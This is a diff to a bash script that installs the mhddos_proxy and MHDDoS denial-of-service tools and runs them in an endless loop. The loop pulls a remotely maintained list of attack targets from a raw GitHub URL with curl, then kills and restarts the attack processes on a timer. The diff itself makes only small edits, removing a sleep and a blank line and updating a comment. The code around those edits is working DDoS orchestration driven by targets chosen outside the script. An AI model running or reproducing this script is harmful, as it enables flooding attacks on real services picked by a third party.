@@ -41,7 +41,6 @@ if [ ! -f /usr/bin/curl ]; then
 fi
 pip install --upgrade pip > /dev/null #No output. Resolved some problems with pip on debian
 
-
 #Install latest version of mhddos_proxy and MHDDoS
 cd ~
 rm -rf mhddos_proxy
@@ -56,7 +55,7 @@ python3 -m pip install -r MHDDoS/requirements.txt
 while true
 echo -e "#####################################\n"
 do
-   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
+   # Get number of targets in runner_targets. Only strings that starts with "runner.py" are used. Everything else is ommited.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py" | wc -l)
    
    echo -e "\nNumber of targets in list: " $list_size "\n"
@@ -87,5 +86,4 @@ sleep $restart_interval
 echo -e "RESTARTING\n"
 pkill -f start.py #In theory should work but doesn't give good results
 pkill python3 #It just works (c)
-sleep 2
 done
